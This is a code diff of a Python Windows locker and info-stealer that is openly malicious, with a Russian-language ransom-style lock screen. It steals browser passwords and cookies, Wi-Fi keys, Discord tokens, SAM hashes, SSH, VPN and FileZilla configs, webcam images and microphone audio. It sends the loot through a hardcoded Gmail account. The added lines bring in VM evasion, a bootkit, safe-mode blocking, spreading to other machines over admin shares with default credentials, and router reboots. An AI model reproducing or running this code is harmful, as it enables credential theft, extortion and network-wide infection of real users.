@@ -19,11 +19,10 @@ GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
 VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
-VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
-AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp_video.mp4")
+AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp_audio.mp3")
 attempts_left = MAX_ATTEMPTS
 keylog_data = []
-data_leak_progress = 0
 
 def hide_console():
     try:
@@ -50,10 +49,9 @@ def is_admin():
 def is_vm():
     try:
         if ctypes.windll.kernel32.IsDebuggerPresent(): return True
-        vm_signs = ["vbox", "vmware", "virtual", "qemu"]
         output = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace').lower()
-        for sign in vm_signs:
-            if sign in output: return True
+        for s in ["vbox", "vmware", "virtual", "qemu"]:
+            if s in output: return True
     except: pass
     return False
 
@@ -79,16 +77,13 @@ def install_bootkit():
     except: pass
 
 def scan_network():
-    devices = []
     try:
         arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        devices = re.findall(r'\d+\.\d+\.\d+\.\d+', arp)
-    except: pass
-    return list(set(devices))
+        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
+    except: return []
 
 def infect_other_pcs():
-    network_devices = scan_network()
-    for ip in network_devices:
+    for ip in scan_network():
         try:
             os.system(f'net use \\\\{ip}\\C$ /user:admin admin >nul 2>&1')
             if os.path.exists(__file__):
@@ -97,8 +92,7 @@ def infect_other_pcs():
         except: pass
 
 def control_router(action="reboot"):
-    routers = [("192.168.1.1", "admin", "admin"), ("192.168.0.1", "admin", "1234")]
-    for ip, user, pwd in routers:
+    for ip, user, pwd in [("192.168.1.1", "admin", "admin"), ("192.168.0.1", "admin", "1234")]:
         try:
             if action == "reboot":
                 urllib.request.urlopen(f"http://{ip}/reboot.cgi", timeout=3)
@@ -196,18 +190,6 @@ def play_video():
         try: ctypes.windll.user32.BlockInput(False)
         except: pass
 
-def jester_anim():
-    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
-    a.configure(bg='#1a3a5c'); a.overrideredirect(True); disable_win_key()
-    f = tk.Frame(a, bg='#1a3a5c'); f.place(relx=0.5, rely=0.5, anchor='center')
-    msgs = [("JESTER ACTIVATED", 24, '#ff4444'), ("Initializing encryption...", 14, 'white'),
-            ("Scanning network...", 14, 'white'), ("Bypassing security...", 14, 'white'),
-            ("SYSTEM COMPROMISED", 30, '#ff4444')]
-    for text, size, color in msgs:
-        l = tk.Label(f, text=text, bg='#1a3a5c', fg=color, font=('Courier', size, 'bold'))
-        l.pack(pady=10); a.update(); time.sleep(1.5); l.destroy()
-    time.sleep(0.5); a.destroy()
-
 def draw_jester():
     img = Image.new('RGBA', (180, 230), (0,0,0,0))
     d = ImageDraw.Draw(img)
@@ -221,53 +203,31 @@ def draw_jester():
     d.ellipse([80, 0, 100, 12], fill='white', outline='black')
     return img
 
-def data_leak(parent):
-    global data_leak_progress
-    frame = tk.Frame(parent, bg='white'); frame.pack(pady=5)
-    tk.Label(frame, text="DATA LEAK:", bg='white', fg='#cc0000', font=('Courier', 9, 'bold')).pack(side='left', padx=5)
-    bar = tk.Canvas(frame, width=150, height=12, bg='#eee', highlightthickness=0); bar.pack(side='left', padx=5)
-    p = bar.create_rectangle(0, 0, 0, 12, fill='#cc0000', outline='')
-    def up():
-        global data_leak_progress
-        while data_leak_progress < 100:
-            data_leak_progress += random.randint(1, 5)
-            if data_leak_progress > 100: data_leak_progress = 100
-            bar.coords(p, 0, 0, 150*data_leak_progress/100, 12)
-            time.sleep(random.uniform(0.5, 2))
-    threading.Thread(target=up, daemon=True).start()
-
-def get_ssh_telnet_targets():
+def get_ssh_targets():
     targets = []
-    try:
-        public_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
-        targets.append(("EXTERNAL", public_ip, "External"))
+    try: targets.append(("EXTERNAL", urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode(), "External"))
     except: pass
-    try:
-        local_ip = socket.gethostbyname(socket.gethostname())
-        targets.append(("LOCAL", local_ip, "Local"))
+    try: targets.append(("LOCAL", socket.gethostbyname(socket.gethostname()), "Local"))
     except: pass
     try:
         route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
         for line in route.split('\n'):
-            if '.' in line and any(c.isdigit() for c in line):
+            if '.' in line:
                 gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                 if gw and not gw[0].startswith('0.'): targets.append(("GATEWAY", gw[0], "Router")); break
     except: pass
     try:
         arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        arp_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', arp)
-        for ip in list(set(arp_ips))[:10]:
+        for ip in list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))[:10]:
             if ip not in [t[1] for t in targets] and not ip.endswith('.255') and not ip.endswith('.0'):
                 targets.append(("NETWORK", ip, "Device"))
     except: pass
     for i, (name, ip, desc) in enumerate(targets):
         for port in [22, 23]:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
                 if s.connect_ex((ip, port)) == 0:
-                    service = "SSH" if port == 22 else "Telnet"
-                    targets[i] = (name, ip, f"{desc} | {service} OPEN!")
+                    targets[i] = (name, ip, f"{desc} | {'SSH' if port==22 else 'Telnet'} OPEN!")
                 s.close()
             except: pass
     return targets
@@ -287,7 +247,7 @@ def _get_master_key(lp):
         except: pass
     return None
 
-def steal_chromium_passwords(browser, paths):
+def steal_chromium(browser, paths):
     res = []
     for lp in paths:
         if not os.path.exists(lp): continue
@@ -302,9 +262,8 @@ def steal_chromium_passwords(browser, paths):
                     if pw[:3] == b'\x76\x31\x31' and mk:
                         pwd = _decrypt_aes_gcm(pw[3:], mk)
                         pwd = pwd.decode('utf-8','ignore') if pwd else "***"
-                    else:
-                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
-                    res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*40)
+                    else: pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
+                    res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n"+ "-"*40)
                 except: res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: ***\n" + "-"*40)
             cur.close()
             try: os.remove(db)
@@ -312,31 +271,32 @@ def steal_chromium_passwords(browser, paths):
         except: pass
     return res
 
-def _parse_asn1(data):
+def steal_wifi():
+    r = []
     try:
-        if data[0] != 0x30: return None, None
-        off = 2 + (data[1] & 0x7F) if data[1] & 0x80 else 2
-        iv = ct = None
-        while off < len(data):
-            tag, l = data[off], data[off+1]
-            val = data[off+2:off+2+l]
-            if tag == 0x04:
-                if iv is None: iv = val
-                else: ct = val
-            off += 2 + l
-        return iv, ct
-    except: return None, None
+        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
+            if 'Все профили' in line:
+                p = line.split(':')[1].strip()
+                if p:
+                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
+                    key = "НЕТ"
+                    for dl in det.split('\n'):
+                        if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
+                    r.append(f"WiFi: {p} | Пароль: {key}")
+    except: pass
+    return r
 
-def _decrypt_3des(data, key, iv):
-    try:
-        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-        from cryptography.hazmat.backends import default_backend
-        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
-        r = dec.update(data) + dec.finalize()
-        return r[:-r[-1]] if r[-1] < 16 else r
-    except: return None
+def steal_discord():
+    tokens = set()
+    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')]:
+        if not os.path.exists(db): continue
+        for f in os.listdir(db):
+            if f.endswith('.ldb') or f.endswith('.log'):
+                try: tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
+                except: pass
+    return list(tokens)[:20]
 
-def steal_firefox_passwords():
+def steal_firefox():
     res = []
     base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
     if not os.path.exists(base): return res
@@ -354,102 +314,66 @@ def steal_firefox_passwords():
             for login in logins.get('logins', []):
                 host = login.get('hostname', ''); user = pwd = "ERROR"
                 try:
-                    iv, ct = _parse_asn1(base64.b64decode(login['encryptedUsername']))
+                    enc = base64.b64decode(login['encryptedUsername'])
+                    iv, ct = None, None
+                    if enc[0] == 0x30:
+                        off = 2 + (enc[1] & 0x7F) if enc[1] & 0x80 else 2
+                        while off < len(enc):
+                            tag, l = enc[off], enc[off+1]; val = enc[off+2:off+2+l]
+                            if tag == 0x04:
+                                if iv is None: iv = val
+                                else: ct = val
+                            off += 2 + l
                     if iv and ct:
-                        d = _decrypt_3des(ct, key, iv)
-                        if d: user = d.decode('utf-8','ignore').lstrip('\x00').strip()
+                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                        from cryptography.hazmat.backends import default_backend
+                        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
+                        r = dec.update(ct) + dec.finalize()
+                        r = r[:-r[-1]] if r[-1] < 16 else r
+                        user = r.decode('utf-8','ignore').lstrip('\x00').strip()
                 except: pass
                 try:
-                    iv, ct = _parse_asn1(base64.b64decode(login['encryptedPassword']))
+                    enc = base64.b64decode(login['encryptedPassword'])
+                    iv, ct = None, None
+                    if enc[0] == 0x30:
+                        off = 2 + (enc[1] & 0x7F) if enc[1] & 0x80 else 2
+                        while off < len(enc):
+                            tag, l = enc[off], enc[off+1]; val = enc[off+2:off+2+l]
+                            if tag == 0x04:
+                                if iv is None: iv = val
+                                else: ct = val
+                            off += 2 + l
                     if iv and ct:
-                        d = _decrypt_3des(ct, key, iv)
-                        if d: pwd = d.decode('utf-8','ignore').lstrip('\x00').strip()
+                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                        from cryptography.hazmat.backends import default_backend
+                        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
+                        r = dec.update(ct) + dec.finalize()
+                        r = r[:-r[-1]] if r[-1] < 16 else r
+                        pwd = r.decode('utf-8','ignore').lstrip('\x00').strip()
                 except: pass
                 res.append(f"URL: {host}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*40)
             cur.close()
         except: pass
     return res
 
-def steal_wifi_passwords():
+def steal_cookies():
     r = []
-    try:
-        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
-            if 'Все профили' in line:
-                p = line.split(':')[1].strip()
-                if p:
-                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
-                    key = "НЕТ"
-                    for dl in det.split('\n'):
-                        if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
-                    r.append(f"WiFi: {p} | Пароль: {key}")
-    except: pass
-    return r
-
-def steal_cookies_all():
-    r = []
-    cookie_paths = []
-    chrome_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
-    if os.path.exists(chrome_base):
-        for folder in os.listdir(chrome_base):
-            if folder == 'Default' or folder.startswith('Profile'):
-                for f in ['Cookies', 'Network/Cookies']:
-                    cp = os.path.join(chrome_base, folder, f)
-                    if os.path.exists(cp): cookie_paths.append(('CHROME', cp))
-    edge_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
-    if os.path.exists(edge_base):
-        for folder in os.listdir(edge_base):
-            if folder == 'Default' or folder.startswith('Profile'):
-                cp = os.path.join(edge_base, folder, 'Cookies')
-                if os.path.exists(cp): cookie_paths.append(('EDGE', cp))
-    yandex_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data')
-    if os.path.exists(yandex_base):
-        for folder in os.listdir(yandex_base):
-            if folder == 'Default' or folder.startswith('Profile'):
-                cp = os.path.join(yandex_base, folder, 'Cookies')
-                if os.path.exists(cp): cookie_paths.append(('YANDEX', cp))
-    opera_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Cookies')
-    if os.path.exists(opera_path): cookie_paths.append(('OPERA', opera_path))
-    ff_base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
-    if os.path.exists(ff_base):
-        for folder in os.listdir(ff_base):
-            ff_cookie = os.path.join(ff_base, folder, 'cookies.sqlite')
-            if os.path.exists(ff_cookie): cookie_paths.append(('FIREFOX', ff_cookie))
-    for browser, cp in cookie_paths:
+    for cp in [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
+               os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')]:
+        if not os.path.exists(cp): continue
         try:
-            db = os.path.join(tempfile.gettempdir(), f'cookie_{browser}_{random.randint(0,9999)}.db')
+            db = os.path.join(tempfile.gettempdir(), f'ck_{random.randint(0,9999)}.db')
             shutil.copy2(cp, db)
-            conn = sqlite3.connect(db)
-            cur = conn.cursor()
-            try:
-                cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
-                for host, name, enc in cur.fetchall():
-                    try:
-                        val = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8','ignore')
-                        r.append(f"{browser} | {host} | {name} | {val[:100]}")
-                    except:
-                        r.append(f"{browser} | {host} | {name} | [encrypted]")
-            except:
+            cur = sqlite3.connect(db).cursor()
+            cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
+            for host, name, enc in cur.fetchall():
                 try:
-                    cur.execute("SELECT host, name, value FROM moz_cookies")
-                    for host, name, val in cur.fetchall():
-                        r.append(f"{browser} | {host} | {name} | {val[:100]}")
+                    val = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8','ignore')
+                    r.append(f"{host} | {name} | {val[:100]}")
                 except: pass
-            conn.close()
-            try: os.remove(db)
-            except: pass
+            cur.close(); os.remove(db)
         except: pass
-    return r[:500] if r else ["Cookies not found"]
-
-def steal_discord():
-    tokens = set()
-    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'), 
-               os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb')]:
-        if not os.path.exists(db): continue
-        for f in os.listdir(db):
-            if f.endswith('.ldb') or f.endswith('.log'):
-                try: tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
-                except: pass
-    return list(tokens)[:20]
+    return r[:300] if r else ["No cookies"]
 
 def dump_sam():
     if not is_admin(): return "No admin"
@@ -535,7 +459,7 @@ def steal_steam():
             fp = os.path.join(steam, f)
             if os.path.exists(fp): send_file_email(fp, f"[DedSek_Logs] Steam {os.path.basename(fp)}")
 
-def steal_vpn_configs():
+def steal_vpn():
     for path in [os.path.join(os.environ['USERPROFILE'], 'OpenVPN', 'config'),
                  os.path.join(os.environ['PROGRAMFILES'], 'OpenVPN', 'config'),
                  os.path.join(os.environ['PROGRAMFILES'], 'WireGuard', 'Data')]:
@@ -546,10 +470,9 @@ def steal_vpn_configs():
                     send_file_email(fp, f"[DedSek_Logs] VPN {f}")
 
 def steal_configs():
-    configs = {"SSH": os.path.join(os.environ['USERPROFILE'], '.ssh', 'id_rsa'),
-               "RDP": os.path.join(os.environ['USERPROFILE'], 'Documents', 'Default.rdp'),
-               "FileZilla": os.path.join(os.environ['APPDATA'], 'FileZilla', 'sitemanager.xml')}
-    for name, path in configs.items():
+    for name, path in {"SSH": os.path.join(os.environ['USERPROFILE'], '.ssh', 'id_rsa'),
+                       "RDP": os.path.join(os.environ['USERPROFILE'], 'Documents', 'Default.rdp'),
+                       "FileZilla": os.path.join(os.environ['APPDATA'], 'FileZilla', 'sitemanager.xml')}.items():
         if os.path.exists(path) and os.path.getsize(path) < 5*1024*1024:
             send_file_email(path, f"[DedSek_Logs] Config {name}")
 
@@ -564,7 +487,7 @@ def steal_clipboard():
     except: pass
 
 def mega_steal():
-    targets = get_ssh_telnet_targets()
+    targets = get_ssh_targets()
     report = ["="*60, "DEDSEK ULTIMATE STEALER", "="*60]
     report.append(f"\nUSER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
     report.append("\nSSH/TELNET TARGETS:")
@@ -574,21 +497,19 @@ def mega_steal():
                         "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
                         "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
                         "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')]}.items():
-        data = steal_chromium_passwords(name, paths)
+        data = steal_chromium(name, paths)
         if data: report.append(f"\n{name}:"); report.extend(data)
-    report.append("\nFIREFOX:")
-    report.extend(steal_firefox_passwords() or ["No data"])
-    report.append("\nWIFI:")
-    report.extend(steal_wifi_passwords() or ["No data"])
-    cookies = steal_cookies_all()
-    if cookies and cookies != ["Cookies not found"]: report.append("\nCOOKIES:"); report.extend(cookies)
+    report.append("\nFIREFOX:"); report.extend(steal_firefox() or ["No data"])
+    report.append("\nWIFI:"); report.extend(steal_wifi() or ["No data"])
+    cookies = steal_cookies()
+    if cookies and cookies != ["No cookies"]: report.append("\nCOOKIES:"); report.extend(cookies)
     tokens = steal_discord()
     report.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
     report.append(f"\nSAM: {dump_sam()}")
     report.append(f"\nОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}")
     text = '\n'.join(report)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")
-    for t in [steal_telegram, steal_steam, steal_vpn_configs, steal_configs, steal_clipboard, capture_webcam, record_mic]:
+    for t in [steal_telegram, steal_steam, steal_vpn, steal_configs, steal_clipboard, capture_webcam, record_mic]:
         threading.Thread(target=t, daemon=True).start()
     try:
         ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
@@ -643,8 +564,8 @@ def reset_windows():
         restore_win_key(); unblock()
         es = tk.Tk(); es.attributes('-fullscreen', True); es.attributes('-topmost', True)
         es.configure(bg='black'); es.overrideredirect(True)
-        tk.Label(es, text="404 | ERROR", bg='black', fg='white', font=('Courier',40,'bold')).pack(expand=True)
-        tk.Label(es, text="ALL DATA DESTROYED...", bg='black', fg='white', font=('Courier',20)).pack()
+        tk.Label(es, text="404 | ОШИБКА", bg='black', fg='white', font=('Courier',40,'bold')).pack(expand=True)
+        tk.Label(es, text="ВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='white', font=('Courier',20)).pack()
         es.update(); time.sleep(5); es.destroy()
         os.system("shutdown /r /t 0 /f"); os._exit(0)
     except: os.system("shutdown /r /t 0 /f"); os._exit(0)
@@ -654,41 +575,56 @@ class WinLocker:
         self.root = tk.Tk(); self.root.withdraw()
         self.win = tk.Toplevel(self.root)
         self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
-        self.win.configure(bg='#1a3a5c'); self.win.overrideredirect(True)
+        self.win.configure(bg='black'); self.win.overrideredirect(True)
         self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
         global attempts_left
         
-        top = tk.Frame(self.win, bg='white', bd=2, relief='solid')
-        top.place(relx=0.5, rely=0.02, anchor='n', width=780, height=260)
-        tk.Label(top, text="#OPdailyallowance", bg='white', fg='#111', font=('Courier', 16, 'bold')).pack(pady=(10,2))
-        tk.Label(top, text="Your files are encrypted.", bg='white', fg='#cc0000', font=('Courier', 12, 'bold')).pack(pady=2)
-        tk.Label(top, text="To unlock you need to solve the riddle.", bg='white', fg='#111', font=('Courier', 10)).pack(pady=3)
-        tk.Label(top, text="If timer expires - all data will be leaked.", bg='white', fg='#cc0000', font=('Courier', 10, 'bold')).pack(pady=3)
-        tk.Label(top, text="More instructions forthcoming - fsociety", bg='white', fg='#666', font=('Courier', 9, 'italic')).pack(pady=2)
-        self.tl = tk.Label(top, text="Time left: 14h 04m 07s", bg='white', fg='#cc0000', font=('Courier', 20, 'bold'))
-        self.tl.pack(pady=5)
-        data_leak(top)
-        try: hn = socket.gethostname(); ip = socket.gethostbyname(hn)
-        except: hn = "Unknown"; ip = "192.251.68.250"
-        tk.Label(top, text=f"System: {hn}  |  IP: {ip}  |  Encrypted: 5,925 files", bg='white', fg='#888', font=('Courier', 8)).pack(pady=5)
+        try:
+            img_data = base64.b64decode(SKULL_BASE64)
+            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
+            with open(img_path, "wb") as f: f.write(img_data)
+            img = PhotoImage(file=img_path)
+            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.05, anchor='center')
+            self.win._img = img
+        except: pass
         
-        btn_frame = tk.Frame(self.win, bg='#1a3a5c'); btn_frame.place(relx=0.5, rely=0.40, anchor='center')
-        for txt in ["Refresh", "Payment", "FAQ", "Decrypt One File", "Support"]:
-            tk.Button(btn_frame, text=txt, bg='#ddd', fg='#333', font=('Courier', 8), relief='raised', bd=1, width=15, state='disabled').pack(side='left', padx=3)
+        try:
+            jester = draw_jester()
+            jp = os.path.join(tempfile.gettempdir(), "jester.png"); jester.save(jp)
+            self.jp = PhotoImage(file=jp)
+            tk.Label(self.win, image=self.jp, bg='black').place(relx=0.85, rely=0.12, anchor='center')
+        except: pass
         
-        jester = draw_jester()
-        jp = os.path.join(tempfile.gettempdir(), "jester.png"); jester.save(jp)
-        self.jp = PhotoImage(file=jp)
-        tk.Label(self.win, image=self.jp, bg='#1a3a5c').place(relx=0.5, rely=0.58, anchor='center')
-        tk.Label(self.win, text="JESTER ☠ ACTUAL", bg='#1a3a5c', fg='white', font=('Courier', 10, 'bold')).place(relx=0.5, rely=0.75, anchor='center')
-        tk.Label(self.win, text='"There is an unequal amount of good and bad in most things.\nThe trick is to figure the ratio and act accordingly."', bg='#1a3a5c', fg='#aaa', font=('Courier', 7, 'italic')).place(relx=0.5, rely=0.80, anchor='center')
-        tk.Label(self.win, text="usa", bg='#1a3a5c', fg='#ffffff15', font=('Arial', 36, 'bold')).place(relx=0.01, rely=0.98, anchor='sw')
+        msg = f"""Ну привет друг, как у тебя дела?
+
+Да, понимаю, ты попался.
+Ну и нахуя ты скачал игру из инета?
+Я не пойму...
+
+Ну ладно, вот тебе загадка. Там пароль.
+
+Я — год, когда произошло событие,
+которое не произошло.
+В Англии заговорщики планировали
+взорвать парламент и убить короля.
+Их план провалился, король выжил,
+а заговорщиков казнили.
+Но в Windows я стал началом времён.
+Потому что я — первый год,
+который существует в этом мире,
+но не существовал в реальности.
+
+ЧТО Я ЗА ЧИСЛО?
+
+У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
         
-        cf = tk.Frame(self.win, bg='#1a3a5c'); cf.place(relx=0.5, rely=0.88, anchor='center')
-        tk.Label(cf, text="ENTER PASSWORD:", bg='#1a3a5c', fg='white', font=('Courier', 10, 'bold')).pack(pady=(0,2))
-        self.pw = tk.Entry(cf, show="*", font=('Courier', 10, 'bold'), bg='white', fg='black', relief='solid', bd=1)
-        self.pw.pack(pady=(0,2), ipadx=20, ipady=1)
-        self.sl = tk.Label(cf, text=f"ATTEMPTS LEFT: {attempts_left}", bg='#1a3a5c', fg='white', font=('Courier', 9))
+        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',9,'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')
+        
+        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
+        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
+        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', insertbackground='black', relief='solid', bd=2)
+        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
+        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
         self.sl.pack()
         self.pw.bind('<Return>', self.check); self.pw.focus_force()
         self.win.after(100, self._keep)
@@ -701,28 +637,32 @@ class WinLocker:
         global attempts_left
         if self.pw.get() == PASSWORD:
             restore_win_key(); unblock()
-            self.sl.config(text="CORRECT!", fg='#0f0'); self.win.update(); time.sleep(1)
+            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update(); time.sleep(1)
             self.root.destroy(); os._exit(0)
         else:
             attempts_left -= 1
-            if attempts_left > 0: self.sl.config(text=f"WRONG! LEFT: {attempts_left}", fg='white')
+            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
             else:
-                self.sl.config(text="404 | ERROR", fg='white'); self.win.update(); time.sleep(2)
+                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update(); time.sleep(2)
                 self.root.destroy(); reset_windows()
             self.pw.delete(0, tk.END)
 
 if __name__ == "__main__":
-    hide_console()
-    disable_win_key()
-    add_to_startup()
+    hide_console(); disable_win_key(); add_to_startup()
+    
+    if is_vm():
+        send_email("VM DETECTED", "Anti-VM")
+        os._exit(0)
+    
+    block_safe_mode()
+    install_bootkit()
     
     threading.Thread(target=mega_steal, daemon=True).start()
     threading.Thread(target=record_loop, daemon=True).start()
     threading.Thread(target=keylogger_thread, daemon=True).start()
-    time.sleep(3)
+    threading.Thread(target=kill_procs, daemon=True).start()
     
-    try: jester_anim()
-    except: pass
+    time.sleep(3)
     
     try:
         download_video()
@@ -731,10 +671,11 @@ if __name__ == "__main__":
         play_video()
     except: pass
     
+    threading.Thread(target=infect_other_pcs, daemon=True).start()
+    threading.Thread(target=lambda: control_router("reboot"), daemon=True).start()
+    
     try: block_keys()
     except: pass
-    
-    threading.Thread(target=kill_procs, daemon=True).start()
     
     WinLocker()
     tk.mainloop()
